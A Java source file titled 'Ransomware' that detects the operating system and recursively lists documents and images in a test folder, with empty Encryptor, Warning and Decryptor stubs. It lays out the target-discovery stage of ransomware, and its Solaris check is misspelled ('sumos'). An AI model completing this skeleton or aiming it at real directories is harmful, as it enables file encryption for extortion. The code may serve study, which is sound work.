import org.apache.commons.io.FileUtils;
import java.util.*;
import java.io.*;

public class Ransomware {

  // enums for OS
  public enum OS {
    WINDOWS,
    LINUX,
    MAC,
    SOLARIS
  };


  private static OS os = null;

  public static void main(String[] args) {
    System.out.println("Hello Ransomware");
    FileFinder();
    Encryptor();
    Warning();
    Decryptor();
  }

  // file finder
  public static void FileFinder() {
    switch(getOS()) {
      case WINDOWS:
        System.out.println("Running on Windows");
        break;
      case LINUX:
        System.out.println("Running on Linux");
        break;
      case MAC:
        System.out.println("Running on MAC");
        break;
      case SOLARIS:
      System.out.println("Running on Solaris");
        break;
    }
    // Path
    List<String> CriticalPathList = new ArrayList<String>();
    // adding files (custom test directory)
    CriticalPathList.add(System.getProperty("user.home") + "/ransomware-test");
    // looping list
    for(String targetDir:CriticalPathList) {
      System.out.println(targetDir);
      // setting up path
      File root = new File(targetDir);
      try {
        // common extensions
        String[] extensions = {"pdf", "doc", "png", "txt", "zip", "rar", "jpg", "xls"};
        // collection of found files
        Collection files = FileUtils.listFiles(root, extensions, true); // true = recursive
        // looping collection
        for(Object o: files) {
          // file instance
          File file = (File) o;
          // return files to the Encryptor function
          System.out.println("Found: " + file.getAbsolutePath());
        }
      } catch(Exception e) {
        e.printStackTrace();
      }
    }
  }

  public static void Encryptor() {}
  public static void Warning() {}
  public static void Decryptor() {}

  // getting OS
  public static OS getOS() {
    if(os == null) {
      // getting current OS
      String opSys = System.getProperty("os.name").toLowerCase();
      // detecting OS
      if(opSys.contains("win")) {
        os = os.WINDOWS; // setting up by Enum
      } else if(opSys.contains("nix") || opSys.contains("nux") || opSys.contains("aix")) {
        os = os.LINUX;
      } else if(opSys.contains("mac")) {
        os = os.MAC;
      } else if(opSys.contains("sumos")) {
        os = os.SOLARIS;
      }
    }
    return os;
  }
}
